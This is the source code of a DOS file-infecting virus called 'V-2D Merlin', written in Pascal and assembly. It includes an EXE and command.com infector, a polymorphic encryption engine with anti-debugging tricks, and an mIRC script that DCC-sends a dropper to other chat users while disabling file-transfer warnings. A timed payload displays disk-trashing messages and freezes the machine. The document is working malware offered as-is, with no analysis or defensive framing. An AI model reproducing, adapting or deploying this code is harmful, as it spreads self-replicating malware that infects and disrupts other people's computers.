ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[V.PAS]ÄÄÄ
{$S- $R- $Q- $F-}
uses dos;
type
      mz_hdr = record
        Signature,
        ExtraBytes,
        Pages,
        RelocItems,
        HeaderSize,
        MinAlloc,
        MaxAlloc,
        InitSS,
        InitSP,
        CheckSum,
        InitIP,
        InitCS,
        RelocTable,
        Overlay:     Word;
end;
type
      virii = record
      buffer: Pointer;
      source: Pointer;
      vl:     word;
      OfsSS:  ^word;
      OfsSP:  ^word;
      OfsCS:  ^word;
      OfsIP:  ^word;
end;     

procedure randomize; external; {$L engine.obj}
procedure engine;    external;
procedure demos;     external; {$L payload.obj}
procedure timer(tick:word);external;

var
     f: file;
     dirinfo: searchrec;
     vir: virii;
     mz: mz_hdr;

{ LordDarkMutationEngine version 1.2 }

function  LME(IP: word): word; assembler;
asm
     push ds
     push es
     mov cx, vir.vl 
     mov ax, ip
     les di, vir.buffer
     lds si, vir.source
     shr cx, 1
     adc cx, 0 
     call engine
     xchg ax, cx
     pop es 
     pop ds
end;

function make_dropper( fname: string): boolean;
var
      dropper_len : word;
      res         : longint;
      ff          : file;
begin
      make_dropper  := False;
      mz.Signature  := $5A4D;
      mz.RelocItems := 0;
      mz.HeaderSize := 2;
      mz.MinAlloc   := 0;
      mz.MaxAlloc   := $FFFF;
      mz.InitSS     := 0;
      mz.InitSP     := $FFFE;
      mz.CheckSum   := 0;
      mz.InitIP     := 0;
      mz.InitCS     := 0;

      vir.ofsip^ := 0;
      vir.ofscs^ := $FFF0;
      vir.ofsss^ := 0; 
      vir.ofssp^ := $FFFE;

      dropper_len   := lme(0);
      mz.ExtraBytes := dropper_len mod $200;
      mz.Pages      := dropper_len div $200;
      if mz.ExtraBytes <> 0 Then Inc(mz.Pages);

      assign(ff, fname);
      {$I-} Rewrite(ff,1); {$I+}
      if ioresult <> 0 then exit;
      BlockWrite(ff, Addr(mz)^, sizeof(mz_hdr));      
      BlockWrite(ff, res, 4);
      BlockWrite(ff, vir.buffer^, dropper_len);
      close(ff);
      make_dropper := True;
end;

procedure infect( fname: string );
var
     attr: word;
begin
     assign(f, fname);
     {$i-} reset(f, 1); {$i+}
     if IOResult <> 0 then Exit;
     if (FileSize(f) < 1000) Or (FileSize(f) > (200*1024) ) Then
        Begin Close(f); Exit; End;
     BlockRead(f, Addr(mz)^, sizeof(mz_hdr));
     if mz.InitCS <> 0 Then
     if mz.InitCS = mz.InitSS Then
        Begin Close(f); Exit; End;

     { infect command.com } 

     If (mz.InitCS = 0) and (FileSize(f)<100000) and (FileSize(f) > 70000) Then
     Else
     Begin
     attr := FileSize(f) mod 512;
     if attr <> mz.ExtraBytes Then
        Begin Close(f); Exit; End;
     if attr <> 0 Then Dec(mz.Pages);
     if (FileSize(f) div 512) <> mz.Pages Then
        Begin Close(f); Exit; End;
     End;

     if (mz.signature = $5A4D) or (mz.Signature = $4D5A) then
     else
        Begin Close(f); Exit; End;
     vir.ofsip^ := mz.initip;
     vir.ofscs^ := mz.initcs;
     vir.ofsss^ := mz.initss; 
     vir.ofssp^ := mz.initsp;
     attr := lme((Filesize(f)-mz.HeaderSize*16) mod $10);
     mz.InitIP := (Filesize(f)-mz.HeaderSize*16) mod $10;
     mz.InitCS := (Filesize(f)-mz.HeaderSize*16) div $10;
     mz.InitSS := mz.InitCS;
     mz.InitSP := $FFFE;
     mz.Pages  := (FileSize(f)+attr) div 512;
     mz.ExtraBytes := (FileSize(f)+attr) mod 512;
     if mz.ExtraBytes <> 0 Then Inc(mz.Pages);
     Seek(f, FileSize(f));
     BlockWrite(f, vir.buffer^, attr);
     Seek(f, 0);
     BlockWrite(f, Addr(mz)^, sizeof(mz_hdr));
     Close(f);
end;

var
     r: registers;
     w: word;
const
     test_write = #255#0;
     scrypt1: string[186] = 

       '[script]'#$D#$A+
       'n0=run ~merlin.exe'#$D#$A+
       'n1=ON 1:JOIN:#:{ /if ( $nick == $me )'#$D#$A+
       'n2= /dcc send $nick ~merlin.exe'#$D#$A+
       'n3=}'#$D#$A+
       'n4=ON 1:PART:#:{ /if ( $nick == $me )'#$D#$A+
       'n5= /dcc send $nick ~merlin.exe'#$D#$A+
       'n6=}'#$D#$A ;                                 

     scrypt2: string[29] =
       
       #$D#$A+
       '[fileserver]'#$D#$A+
       'Warning=Off'#$D#$A;

procedure make_mirc( path: string) ;
var
        ff: file;  
begin
        if make_dropper(+path+'mirc\'+'~merlin.exe') then
               begin
                  assign(ff, path+'mirc\'+'script.ini');
                  {$I-} reset(ff, 1); {$I+}
                  if ioresult <> 0 then 
                     begin
                         {$I-} rewrite(ff, 1); {$I+}                           
                         if ioresult <> 0 then exit; 
                     end
                  else
                    if filesize(ff) = 186 then begin close(ff); exit; end;
                  close(ff);
                  rewrite(ff,1);
                  BlockWrite(ff, scrypt1[1], length(scrypt1));
                  close(ff);
                  Seek(f, filesize(f));
                  BlockWrite(f, scrypt2[1], length(scrypt2));                     
               end;
        close(f);
end;
     
begin
     randomize; 
     r.ds := seg(vir);
     r.si := ofs(vir);
     intr($91,r); 
     { make mIRC scrypt }
     assign(f,'c:\mirc\mirc.ini');
     {$I-} reset(f, 1); {$I+} 
     if ioresult = 0 then make_mirc('c:\')
     else
       begin
           assign(f,'c:\progra~1\mirc\mirc.ini');
           {$I-} reset(f, 1); {$I+}    
           if ioresult = 0 then make_mirc('c:\progra~1\');
       end;  
     if PortW[$40] = 666 then
        begin
           demos;
           Writeln('V-2D Merlin');
           Writeln;
           Writeln('Now you die!');
           Writeln;
           Write('Trash your disk ');
           for w:=1 to 20 do
               begin
                   write('.');
                   timer(4); 
               end;
            Writeln;
            Writeln('Now you disk is fucked!!!!');
            asm
               { Hang up }
               cli
            @0:
               jmp @0  
            end;    
        end; 
     assign(f, test_write);
     {$i-} rewrite(f, 1); {$i+}
     if IOResult <> 0 Then Halt(0);
     close(f);
     erase(f);
     FindFirst('*.exe', Archive, DirInfo);
     w:=0; 
     while DosError = 0 do
     begin
        Inc(w);
        If w > 20 Then Break;
        Infect(DirInfo.Name);
        FindNext(DirInfo);
     end;
     infect(GetEnv('COMSPEC'));
end.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[V.PAS]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[VV.ASM]ÄÄÄ
len_body_in_mem equ 100h+RealBody+1000

.model tiny
.code
org 100h
start:
      call $+3 
delta:
      cld      
      pop  bp
      push cs
      pop  ds
      push 2 ptr cs:[bp+OldSP-delta]
      push 2 ptr cs:[bp+OldSS-delta]
      push 2 ptr cs:[bp+OfsRET-delta]
      push 2 ptr cs:[bp+SegRET-delta]
      mov ax, 3590h
      int 21h
      mov 2 ptr cs:[old90-delta+bp],   bx
      mov 2 ptr cs:[old90+2-delta+bp], es
      mov ax, 3591h
      int 21h
      mov 2 ptr cs:[old91-delta+bp],   bx
      mov 2 ptr cs:[old91+2-delta+bp], es
      mov ax, 2590h
      lea dx, [bp+int_90-delta]
      int 21h
      mov ax, 2591h
      lea dx, [bp+int_91-delta]
      int 21h
      ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
      mov bx, cs
      cmp bx, 8000h
      ja  int_90 
      lea ax, [bp+buffer-delta]
      mov cl, 4
      shr ax, cl
      inc ax
      add ax, bx
      mov 2 ptr cs:[bp+bufseg-delta], ax
      mov es, ax
      mov ah, 62h
      int 21h
      mov ds, bx
      sub di, di
      sub si, si
      mov cx, 100h/2
      cld
      rep movsw
      push cs
      pop  ds
      lea si, [bp+vir-delta]
      mov cx, body_len
      rep movsb
      mov ax, es
      mov ds, ax
      add ax, 10h
      mov 2 ptr ds:[relocofs+100h], ax     
      mov bx, ax
      add bx, Start_SS
      cli 
      mov ss, bx
      mov sp, 0FFFEh
      sti
      push ax
      sub ax, ax 
      push ax
      retf
int_90:
      call $+3
_delta:
      pop bp
_exit:
      ; ds=cs; bp=delta
      cli
      push cs
      pop  ss
      mov  sp, 0FFF6h
      sti
      pop 2 ptr cs:[bp+SegRET-_delta]
      pop 2 ptr cs:[bp+OfsRET-_delta]
      pop 2 ptr cs:[bp+OldSS-_delta]
      pop 2 ptr cs:[bp+OldSP-_delta] 
      lds dx, 4 ptr cs:[bp+old90-_delta]
      mov ax, 2590h
      int 21h
      lds dx, 4 ptr cs:[bp+old91-_delta]
      mov ax, 2591h
      int 21h
      mov ah, 62h
      int 21h
      mov es, bx
      mov ds, bx
      mov dx, 80h
      mov ah, 1Ah
      int 21h
      add bx, 10h
      add 2 ptr cs:[bp+segRET-_delta], bx
      cli
      db  81h,0C3h
      dw  0
oldSS equ 2 ptr $-2
      mov ss, bx
      mov sp, 0FFFEh
oldSP equ 2 ptr $-2
      sub cx, cx
      mul cx     ; ax=dx=cx=0
      sub bx, bx
      sub si, si
      sub di, di
      sub bp, bp
      sti
      db  0EAH
ofsRET    dw 0
segRET    dw -10h

_vir struc
       _buffer dd ?
       source dd ?
       _vl    dw ?
       OfsSS  dd ?
       OfsSP  dd ?
       OfsCS  dd ?
       OfsIP  dd ?    
ends


int_91:
     call $+3
$delta:
     pop  bp 
     ; ax:si ??
     mov  ax, 2 ptr cs:[bp+bufseg-$delta]
     mov  2 ptr ds:[si._vir._vl], vl 
     mov  2 ptr ds:[si._vir._buffer],   len_body_in_mem 
     mov  2 ptr ds:[si._vir._buffer+2], ax
     mov  ax, cs 
     mov  2 ptr ds:[si._vir.source+2], ax
     mov  2 ptr ds:[si._vir.OfsSS+2],  ax
     mov  2 ptr ds:[si._vir.OfsSP+2],  ax 
     mov  2 ptr ds:[si._vir.OfsCS+2],  ax
     mov  2 ptr ds:[si._vir.OfsIP+2],  ax
     ;;;
     lea  ax, [bp+start-$delta]
     mov  2 ptr ds:[si._vir.source],   ax
     lea  ax, [bp+ofsret-$delta]
     mov  2 ptr ds:[si._vir.ofsip],    ax
     lea  ax, [bp+segret-$delta]
     mov  2 ptr ds:[si._vir.ofscs],    ax
     lea  ax, [bp+oldsp-$delta]
     mov  2 ptr ds:[si._vir.ofssp],    ax
     lea  ax, [bp+oldss-$delta]
     mov  2 ptr ds:[si._vir.ofsss],    ax    
     iret  
include virstarz.inc
vir:
include v.inc
vl = ($-start)
bufseg  dw ?
old90   dd ?
old91   dd ?
buffer:
end start
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[VV.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENGINE.ASM]ÄÄÄ
.286
locals __
.model small, pascal
.code
public engine
public randomize
include engine.inc
randomize:
    mov ah, 2CH
    int 21h
    mov cs:[a], cx
    mov cs:[b], dx
    ret   
random:
    push bx cx dx
    push ax
    mov ax, 0
    org $-2
A   dw  0
    mov bx, 0
    org $-2
B   dw  0
    mov cx, ax
    mov dx, 8405h
    mul dx
    shl cx, 3
    add ch, cl
    add dx, cx
    add dx, bx
    shl bx, 2
    add dx, bx
    add dh, bl
    mov cl, 5  
    shl bx, cl
    add dh, bl
    add ax, 1
    adc dx, 0
    mov 2 ptr cs:[A], ax
    mov 2 ptr cs:[B], dx
    pop bx
    mov cx, dx
    mul bx
    mov ax, cx
    mov cx, dx
    mul bx
    add ax, cx
    adc dx, 0
    xchg ax, dx
    pop dx cx bx
    ret
one_byte:
    clc
    cld
    cli
    cmc
    sti
    nop
    stc
    std
    sahf
ob_len = ($-one_byte)
buffer:
end
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENGINE.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENGINE.INC]ÄÄÄ
engine:
    _ax = 0
    _cx = 1
    _dx = 2
    _bx = 3
    _sp = 4
    _bp = 5
    _si = 6
    _di = 7
    mov $di, di
    mov $cx, cx
    mov $si, si
    mov $ax, ax 
    mov 1 ptr cs:reg1, -1
    ;----------[ Start]--- 
    call gen_garbage
    mov  ax, 0
    org  $-2
    mov  al, 0ADh
    stosw
    mov  1 ptr cs:reg1, _ax
    call gen_garbage
    mov  ax, 0
    org  $-2
    out  64h, al
    stosw
    mov  1 ptr cs:reg1, -1
    call gen_garbage
    call not_trace
    call gen_garbage 
    mov ax, 4
    call random
    ; 3 5 6 7
    cmp al, 0
    jnz __1
    mov al, 3
    jmp __2
__1:
    add al, 5-1
__2:
    mov cs:reg1, al
    ; mov reg, offset body
    call load
    push di
    call gen_garbage
    mov al, 2Eh
    stosb
    mov ax, 3
    call random
    shl al, 1
    mov bx, ax
    mov ax, 2 ptr cs:[bx+decrypt_inst]
    mov cs:_crypt, ax
    add bx, offset crypt_inst
    mov al, 1 ptr cs:[bx]
    stosb
    mov al, 0
reg1 equ byte ptr $-1
    ; _bx _si _di _bp
    ;  3   0   1   2
    ;  3   6   7   5
    cmp al, _bx
    jz  __4
__3:
    cmp al, _si
    jnz __5
    mov al, 0
    jmp __4
__5:
    cmp al, _di
    jnz __6
    mov al, 1
    jmp __4
__6:
    mov al, 2     
__4:
    or  al, cs:[bx+1]
    stosb
; ->
    mov  cs:ofs_body, di ; ofs
    stosw 
$$1:
    mov  ax, -1
    call random
    test ax, ax
    jz   $$1  
    stosw
    mov  cs:key, ax ; key
    call gen_garbage
    ;-------[ Inc ]--- 
    mov al, 40h
    or  al, cs:reg1
    stosb
    push ax
    call gen_garbage 
    pop  ax
    stosb
    call gen_garbage    
    ;--------[ Cmp ]---
    mov al, 10000001b
    stosb
    mov al, 11111000b
    or  al, cs:reg1
    stosb
; ->
    mov cs:max_ofs, di
    stosw
    ;--------[ Jne ]--- 
    mov al, 75h
    stosb
    pop ax
    push ax
    sub ax, di
    dec ax
    cmp ax, not 80h
    ja  _$1
    mov 1 ptr es:[di-1], 74h
    mov 1 ptr es:[di],   03h
    mov 1 ptr es:[di+1], 0E9h
    inc di 
    inc di 
    sub ax, 3     
    stosw    
    jmp  _$2
_$1: 
    stosb
_$2:
    ;------------------ 
    call gen_garbage
    mov  ax, 0
    org  $-2
    mov  al, 0AEh
    stosw
    mov  1 ptr cs:reg1, _ax
    call gen_garbage
    mov  ax, 0
    org  $-2
    out  64h, al
    stosw
    mov  1 ptr cs:reg1, -1
    call gen_garbage  
    ;----------------
    mov bx, di
    sub bx, offset buffer
$di equ 2 ptr $-2
    pop si
$$2:
    mov ax, -1
    call random
    cmp  ax, 8000h
    jb   $$3
    test ax, 1
    ; and ax, 1
    jnz  $$2    
$$3:   
    xchg ax, dx
    mov ax, bx
    add ax, 100h
$ax equ 2 ptr $-2
    add ax, dx
    mov 2 ptr es:[si-2], ax
    neg dx
    mov bx, 0
ofs_body equ 2 ptr $-2
    mov 2 ptr es:[bx], dx
    mov cx, 1234h
$cx equ 2 ptr $-2
    shl cx, 1
    add ax, cx  
    mov bx, 0
max_ofs equ 2 ptr $-2
    mov 2 ptr es:[bx], ax 
    mov si, 0
$si equ 2 ptr $-2
    mov cx, $cx
    mov bx, 0
key equ 2 ptr $-2
__x:
    lodsw
_crypt dw 0 
    stosw
    loop __x
    mov cx, di
    sub cx, cs:$di 
    ret

load proc
    push ax
    mov ax, 2
    call random
    test ax, ax
    pop ax
    jz  fuck_it
    shl al, 3
    or  al, 06h
    xchg al, ah
    mov al, 8Dh
    stosw  
    jmp __fuck_it
fuck_it: 
    or al, 0B8h
    stosb
__fuck_it:
    xchg ax, dx
    stosw
    ret
    endp

not_trace proc
     mov ax, 2
     call random
     test ax, ax
     jz  __1
     call anti_1
     call gen_garbage
     call anti_2
     jmp __2
__1:
     call anti_2
     call gen_garbage
     call anti_1
__2:
     mov dx, 3521h
     mov al, 0
     call load
     mov  ax, 21CDh
     stosw
     mov  cs:reg1, _bx
     call gen_garbage
     mov  ax, 0
     org  $-2
     mov  al, 0CFh
     stosw
     mov  cs:regX, _ax
     call gen_garbage
     mov  ax, 8626h
     stosw
     mov  al, 7
     stosb
     call gen_garbage
     mov  ax, 4CB4h
     stosw
     call gen_garbage  
     mov  ax, 21CDh
     stosw
     call gen_garbage
     mov  ax, 2
     call random
     test ax, ax
     mov  ah, 86h
     jnz  __m
     mov  ah, 88h
__m:
     mov  al, 26h
     stosw   
     mov  al, 7
     stosb
; B0 CF			    mov	al, 0CFh
; 26: 86 07		    xchg al, 1 ptr es:[bx]
; B4 4C			    mov	 ah, 4Ch
; CD 21			    int	 21h
; 26: 88 07		    mov	 1 ptr es:[bx],	al
     mov  cs:reg1, -1 
     mov  cs:regX, -1
     call gen_garbage
     ret
anti_1:
     mov dx, 3501h
_anti_x:
     mov al, 0
     call load
     mov  ax, 21CDh
     stosw
     mov  cs:reg1, _bx
     call gen_garbage
     mov  ax, 0C626h
     stosw
     mov  ax, 0CF07h
     stosw 
     mov  cs:reg1, -1
     call gen_garbage
     ret
anti_2:
     mov dx, 3503h
     jmp _anti_x
     endp

crypt_inst:
     db 10000001b,10110100b
     db 10000001b,10000100b
     db 10000001b,10101100b
decrypt_inst:
     xor ax, bx
     sub ax, bx
     add ax, bx

gen_garbage:
     push dx
     mov ax, 10
     call random
     inc ax
     xchg ax, cx
__1:
     push cx
     call garage
     pop  cx
     loop __1
     pop dx
     ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
big_garbage:
; ADD/SUB/XOR/ROL/TEST/CMP...
IZM_1 = 1
IZM_0 = 0
IZM_2 = 2
    db 10001011b, IZM_1 ; mov
    db 00000011b, IZM_1 ; add
    db 00010011b, IZM_1 ; adc
    db 00100011b, IZM_1 ; and
    db 00001011b, IZM_1 ; or
    db 00101011b, IZM_1 ; sub
    db 00011011b, IZM_1 ; sbb
    db 00110011b, IZM_1 ; xor
    db 00111011b, IZM_0 ; cmp
    db 10000101b, IZM_0 ; test    
    db 11010001b, IZM_2 ; rxx ®â 0..7 ªà®¬¥ 6
len_big_garbage = ($-big_garbage)/2

free_reg:
     mov ax, 8
     call random
     cmp al, cs:reg1
     jz  free_reg
     cmp al, 4
     jz  free_reg
     cmp al, 0ffh
regX equ byte ptr $-1
     jz  free_reg 
     ret

gen_mov:
     mov ax, 0fffeh
     call random
     xchg ax, dx
     call free_reg
     jmp  load 

gen_byte:
       push bx
       mov ax, ob_len
       call random
       lea bx, one_byte
       xlat byte ptr cs:[bx]
       stosb
       pop bx
       ret

garage:
     mov ax, len_big_garbage+2
     call random
     cmp al, len_big_garbage
     jz  gen_byte
     cmp al, len_big_garbage+1
     jz  gen_mov
     shl ax, 1
     add ax, offset big_garbage
     mov bx, ax
     mov al, cs:[bx]
     stosb
     mov al, cs:[bx+1]
     cmp al, 2
     jnz _standart
__k:
     mov ax, 8
     call random
     cmp al, 6
     jz  __k
     shl al, 3
     or  al, 0C0h
     mov bl, al
     call free_reg
     or  al, bl
     stosb
     ret
_standart:    
     push ax
     mov  ax, 4
     call random
     sub  dl, dl
     cmp  al, 3
     jz   $$0
     dec  di
     mov  ah, es:[di]
     lea  bx, prefix
     xlat 1 ptr cs:[bx]
     stosb
     mov  al, ah
     stosb   
     inc dl
$$0:   
     pop  ax   
     cmp al, 0
     jnz not_change 
     mov ax, 8
     call random
     jmp mumu
not_change:
     call free_reg
mumu:
     shl al, 3
     push ax
     mov ax, 2
     call random
     test ax, ax
     pop ax
     jz __p
     test dl, dl
     jz  __op 
     ; Prefix, Command 
     mov ah, es:[di-1]
     mov 1 ptr es:[di-2], ah
     dec di
__op:
     or al, 0C0h
     stosb
     mov ax, 8
     call random
     or 1 ptr es:[di-1], al 
     ret  
__p:
     ; al -reg
     or  al, 110b
     stosb
     mov  ax, 0FFFEh
     call random
     stosw       
     ret 
prefix:
     segss
     segcs
     seges 
 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENGINE.INC]ÄÄÄ
